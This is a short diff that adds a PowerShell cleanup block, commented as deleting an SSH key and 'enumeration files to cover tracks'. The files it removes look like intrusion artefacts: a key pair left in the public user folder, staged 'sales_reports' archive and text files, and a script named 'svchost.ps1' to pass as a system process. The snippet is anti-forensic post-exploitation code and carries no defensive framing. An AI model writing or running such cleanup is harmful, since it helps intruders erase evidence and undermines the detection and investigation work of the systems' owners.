@@ -1,0 +1,6 @@
+# Delete ssh key and enumeration files to cover tracks
+rm C:\Users\Public\x1y2z3 -Force
+rm C:\Users\Public\x1y2z3.pub -Force
+rm $env:APPDATA\sales_reports.zip 
+rm $env:APPDATA\sales_reports.txt
+rm $env:APPDATA\svchost.ps1
